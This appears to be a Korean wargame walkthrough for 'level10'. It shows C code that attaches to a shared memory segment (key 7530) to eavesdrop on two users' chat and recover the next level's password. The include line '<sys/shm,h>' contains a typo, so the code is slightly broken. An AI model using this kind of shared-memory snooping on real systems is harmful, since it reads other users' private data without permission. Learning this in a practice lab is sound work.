level10
===
1. 힌트파일을 열어보면 다음과 같은 메세지가 작성되어 있는 것을 볼 수 있다. 
<p>두 명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다. 그 대화방은 공유 메모리를 이용하여 만들어졌으며, 

key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여  level11의 권한을 얻어라

-레벨을 완료하셨다면 소스는 지우고 나가주세요.</p>
힌트 내용을 살펴보니 공유메모리에 접근해서 공유 메모리의 데이터를 읽는 문제인 것 같다.
<p>여기서 공유메모리란 여러 프로세스에서 동시에 접속할 수 있는메모리이다.</p>

2. 힌트에나온 공유메모리에 접근하기위해 다음과 같은 소스코드를 작성하고, 컴파일 한다.
```c
#include<stdio.h>
#include<sys/shm,h>
#include<sys/ipc.h>
#include<sys/types.h>

int main(){
    int shmid;
    char* shared_memory;
    shmid = shmget(7530, 1024, 0666);
    shared_memory=shmat(shmid, NULL, 0);
    printf("shared_memory is : %s\n", shared_memory);
    shmdt(shared_memory);
    return 0;
}
``` 
3. memory.c 를 실행하면 level11의 password를 알 수있다.